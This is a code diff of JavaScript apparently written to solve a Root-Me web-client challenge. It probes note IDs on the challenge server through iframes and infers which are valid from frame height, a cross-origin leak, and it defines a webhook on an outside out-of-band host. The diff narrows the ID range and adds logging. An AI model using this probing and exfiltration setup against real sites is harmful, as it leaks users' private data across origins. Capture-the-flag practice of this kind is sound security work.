@@ -2,7 +2,7 @@
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
-function testRange(a = 0, b = 2000) {
+function testRange(a = 1470, b = 1481) {
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
 
@@ -14,7 +14,7 @@ function testRange(a = 0, b = 2000) {
 
         iframe.onload = () => {
             const h = iframe.offsetHeight;
-
+            console.log(h);
             if (h > 300) {
                 console.log("LIKELY VALID:", i);
 
